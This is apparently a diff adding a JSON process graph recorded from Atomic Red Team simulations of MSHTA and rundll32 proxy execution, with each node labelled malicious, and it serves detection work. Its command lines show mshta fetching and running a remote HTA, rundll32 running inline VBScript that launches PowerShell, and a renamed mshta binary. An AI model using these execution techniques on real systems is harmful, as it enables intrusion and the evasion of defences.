@@ -1,0 +1,1611 @@
+{
+  "nodes": [
+    {
+      "id": "Process:{7901BC46-5350-6008-2006-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host 6cda27da-17d1-4090-9acf-b86eee7d514d; Start-Sleep -Seconds 2; exit",
+        "parent_image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5350-6008-2006-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5350-6008-1F06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5350-6008-1F06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5351-6008-2806-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "command_line": "\"C:\\Windows\\System32\\mshta.exe\" \"C:\\Users\\Administrator\\Downloads\\AtomicTestHarnesses-master\\AtomicTestHarnesses-master\\TestHarnesses\\test.hta\"",
+        "parent_image": "%WINDIR%\\System32\\wbem\\WmiPrvSE.exe",
+        "guid": "{7901BC46-5351-6008-2806-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5351-6008-2606-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host 97e83464-b62c-4bdd-827e-3367eef7b71a; Start-Sleep -Seconds 2; exit",
+        "parent_image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5351-6008-2606-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5351-6008-2306-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5351-6008-2306-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5351-6008-2206-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5351-6008-2206-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa; Start-Sleep -Seconds 2; exit",
+        "parent_image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5352-6008-2C06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5352-6008-2B06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5352-6008-2B06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5352-6008-2906-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Start-Sleep -Seconds 2; exit",
+        "parent_image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5352-6008-2906-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:e9848c7a3d167aac",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_ufekcmfa.kms.ps1"
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5353-6008-3006-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\SysWOW64\\mshta.exe",
+        "guid": "{7901BC46-5353-6008-3006-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5353-6008-2F06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "explorer",
+        "image": "%WINDIR%\\explorer.exe",
+        "guid": "{7901BC46-5353-6008-2F06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-4986-6008-0C00-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "svchost",
+        "image": "%WINDIR%\\System32\\svchost.exe",
+        "guid": "{7901BC46-4986-6008-0C00-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5355-6008-3506-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\SysWOW64\\mshta.exe",
+        "guid": "{7901BC46-5355-6008-3506-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5354-6008-3406-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "explorer",
+        "image": "%WINDIR%\\explorer.exe",
+        "guid": "{7901BC46-5354-6008-3406-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5356-6008-3A06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\SysWOW64\\mshta.exe",
+        "guid": "{7901BC46-5356-6008-3A06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5356-6008-3906-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "explorer",
+        "image": "%WINDIR%\\explorer.exe",
+        "guid": "{7901BC46-5356-6008-3906-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5357-6008-3F06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\SysWOW64\\mshta.exe",
+        "guid": "{7901BC46-5357-6008-3F06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5357-6008-3E06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "explorer",
+        "image": "%WINDIR%\\explorer.exe",
+        "guid": "{7901BC46-5357-6008-3E06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5359-6008-4406-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\SysWOW64\\mshta.exe",
+        "guid": "{7901BC46-5359-6008-4406-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5359-6008-4306-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "explorer",
+        "image": "%WINDIR%\\explorer.exe",
+        "guid": "{7901BC46-5359-6008-4306-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-535A-6008-4706-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-535A-6008-4706-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-535B-6008-4A06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-535B-6008-4A06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-535D-6008-4D06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-535D-6008-4D06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-535E-6008-5006-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-535E-6008-5006-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-535F-6008-5306-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-535F-6008-5306-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5361-6008-5606-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5361-6008-5606-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5362-6008-5906-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5362-6008-5906-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5363-6008-5C06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5363-6008-5C06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5364-6008-5F06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5364-6008-5F06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5366-6008-6206-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5366-6008-6206-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5367-6008-6606-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa; Start-Sleep -Seconds 2; exit",
+        "parent_image": "%WINDIR%\\System32\\rundll32.exe",
+        "guid": "{7901BC46-5367-6008-6606-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5367-6008-6506-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "rundll32",
+        "image": "%WINDIR%\\System32\\rundll32.exe",
+        "guid": "{7901BC46-5367-6008-6506-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5368-6008-6806-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "rundll32",
+        "image": "%WINDIR%\\System32\\rundll32.exe",
+        "command_line": "\"C:\\Windows\\System32\\rundll32.exe\" vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(Close(CreateObject(\"Wscript.Shell\").Run(\"powershell.exe%%20-nop%%20-Command%%20Write-Host%%20aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa;%%20Start-Sleep%%20-Seconds%%202;%%20exit\",0,true)),0)",
+        "parent_image": "%WINDIR%\\System32\\wbem\\WmiPrvSE.exe",
+        "guid": "{7901BC46-5368-6008-6806-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-536A-6008-6B06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "rundll32",
+        "image": "%WINDIR%\\System32\\rundll32.exe",
+        "guid": "{7901BC46-536A-6008-6B06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-536B-6008-6E06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "rundll32",
+        "image": "%WINDIR%\\System32\\rundll32.exe",
+        "guid": "{7901BC46-536B-6008-6E06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-536C-6008-7106-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "rundll32",
+        "image": "%WINDIR%\\System32\\rundll32.exe",
+        "command_line": "\"C:\\Windows\\System32\\rundll32.exe\" about:\"\\..\\mshtml,RunHTMLApplication \"%%3Chta:application%%3E%%3Cscript%%20language=\"VBScript\"%%3EClose(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%%20\"\"powershell.exe%%20-nop%%20-Command%%20Write-Host%%20aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa;%%20Start-Sleep%%20-Seconds%%202;%%20exit\"\",0,true\"))%%3C/script%%3E",
+        "parent_image": "%WINDIR%\\System32\\wbem\\WmiPrvSE.exe",
+        "guid": "{7901BC46-536C-6008-7106-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-536E-6008-7406-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-536E-6008-7406-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-536F-6008-7706-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-536F-6008-7706-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5371-6008-7A06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5371-6008-7A06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5372-6008-7D06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5372-6008-7D06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5373-6008-8006-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5373-6008-8006-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5382-6008-8406-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host 687550c1-f80d-4009-a018-38aba1298c46; Start-Sleep -Seconds 2; exit",
+        "parent_image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5382-6008-8406-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5382-6008-8306-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-5382-6008-8306-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-538F-6008-8E06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host 51ec02cd-8d80-45b5-9694-0e191323d056; Start-Sleep -Seconds 2; exit",
+        "parent_image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-538F-6008-8E06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-538F-6008-8D06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-538F-6008-8D06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:d6c84384a2093a73",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_nzfv3qed.5lw.ps1"
+      }
+    },
+    {
+      "id": "Process:{7901BC46-53CF-6008-9B06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{7901BC46-53CF-6008-9B06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-4FA9-6008-4305-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{7901BC46-4FA9-6008-4305-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:f69b3a4e74b8b840",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"
+      }
+    },
+    {
+      "id": "File:a9abe70364480e79",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\art-err.txt",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\art-err.txt"
+      }
+    },
+    {
+      "id": "File:732f8e2af3e43fa4",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\art-out.txt",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\art-out.txt"
+      }
+    },
+    {
+      "id": "File:a94ff93e06f728ee",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\zh1ejr54\\zh1ejr54.dll",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\zh1ejr54\\zh1ejr54.dll"
+      }
+    },
+    {
+      "id": "File:8203cbaa0e31f1e8",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_tlmhrsf3.awi.ps1"
+      }
+    },
+    {
+      "id": "Process:{7901BC46-53D1-6008-A006-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "command_line": "\"C:\\Windows\\system32\\mshta.exe\" \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta\"",
+        "parent_image": "%WINDIR%\\System32\\wbem\\WmiPrvSE.exe",
+        "guid": "{7901BC46-53D1-6008-A006-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:474bce42af619a39",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\gbnoslx1\\gbnoslx1.dll",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\gbnoslx1\\gbnoslx1.dll"
+      }
+    },
+    {
+      "id": "File:a15a20aa773cbfca",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\bfo3jm2b\\bfo3jm2b.dll",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\bfo3jm2b\\bfo3jm2b.dll"
+      }
+    },
+    {
+      "id": "File:967b865e13957009",
+      "type": "File",
+      "properties": {
+        "path": "%USER%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\4SJ06GRQ\\T1218.005[1].hta",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\microsoft\\windows\\inetcache\\ie\\4sj06grq\\t1218.005[1].hta"
+      }
+    },
+    {
+      "id": "Network:bc22f587c8116e9b",
+      "type": "Network",
+      "properties": {
+        "address": "151.101.52.133",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Process:{7901BC46-53E2-6008-A306-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{7901BC46-53E2-6008-A306-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-53E3-6008-A906-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host bf8a3d31-de38-4b28-9ae6-f990ec1510d4; Start-Sleep -Seconds 2; exit",
+        "parent_image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-53E3-6008-A906-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-53E3-6008-A806-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-53E3-6008-A806-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:18837eee575ce1a5",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\Test.hta",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\test.hta"
+      }
+    },
+    {
+      "id": "File:7194d3da044a955c",
+      "type": "File",
+      "properties": {
+        "path": "C:\\Temp\\notepad.exe",
+        "path_normalized": "c:\\temp\\notepad.exe"
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5457-6008-BE06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host 709e55a1-0ea3-4b31-91f6-147a690f20f4; Start-Sleep -Seconds 2; exit",
+        "parent_image": "C:\\Temp\\notepad.exe",
+        "guid": "{7901BC46-5457-6008-BE06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5457-6008-BD06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "notepad",
+        "image": "C:\\Temp\\notepad.exe",
+        "guid": "{7901BC46-5457-6008-BD06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5466-6008-C006-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "notepad",
+        "image": "C:\\Temp\\notepad.exe",
+        "command_line": "\"C:\\Temp\\notepad.exe\" \"C:\\Users\\Administrator\\Downloads\\AtomicTestHarnesses-master\\AtomicTestHarnesses-master\\TestHarnesses\\Test.hta\"",
+        "parent_image": "%WINDIR%\\System32\\wbem\\WmiPrvSE.exe",
+        "guid": "{7901BC46-5466-6008-C006-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-5467-6008-C106-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host c0ea733d-d021-4ce6-b62e-0c76740c3751; Start-Sleep -Seconds 2; exit",
+        "parent_image": "C:\\Temp\\notepad.exe",
+        "guid": "{7901BC46-5467-6008-C106-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-54A4-6008-CB06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host 83ca34a0-c50d-44ef-b040-94893fd7d4db; Start-Sleep -Seconds 2; exit",
+        "parent_image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-54A4-6008-CB06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-54A4-6008-CA06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{7901BC46-54A4-6008-CA06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:5d29ad639d8891a9",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_f421ntzh.53l.ps1"
+      }
+    },
+    {
+      "id": "Process:{7901BC46-55CB-6008-F306-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\SysWOW64\\mshta.exe",
+        "command_line": "\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\Administrator\\Downloads\\AtomicTestHarnesses-master\\AtomicTestHarnesses-master\\TestHarnesses\\Test.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ",
+        "parent_image": "%WINDIR%\\explorer.exe",
+        "guid": "{7901BC46-55CB-6008-F306-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-55CB-6008-F206-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "explorer",
+        "image": "%WINDIR%\\explorer.exe",
+        "guid": "{7901BC46-55CB-6008-F206-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-55CC-6008-F406-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host fe74ca3e-fcfd-49e4-9327-bc62fc3cb2da; Start-Sleep -Seconds 2; exit",
+        "parent_image": "%WINDIR%\\SysWOW64\\mshta.exe",
+        "guid": "{7901BC46-55CC-6008-F406-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:6f1a3f61a6cb2c45",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_enuny5rn.kau.ps1"
+      }
+    },
+    {
+      "id": "Process:{7901BC46-55FA-6008-FE06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host 0a1004e8-372c-4edb-af5e-773830c2fa81; Start-Sleep -Seconds 2; exit",
+        "parent_image": "C:\\Temp\\notepad.exe",
+        "guid": "{7901BC46-55FA-6008-FE06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{7901BC46-55FA-6008-FD06-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "notepad",
+        "image": "C:\\Temp\\notepad.exe",
+        "guid": "{7901BC46-55FA-6008-FD06-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:d6b73cb01c0148ca",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\__psscriptpolicytest_1u4cpuwj.igo.ps1"
+      }
+    },
+    {
+      "id": "Process:{732C744F-3235-6010-C6A2-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -Command Write-Host 52455ea6-5921-4614-baef-c4d94b254f13; Start-Sleep -Seconds 2; exit",
+        "parent_image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{732C744F-3235-6010-C6A2-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{732C744F-3235-6010-C5A2-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
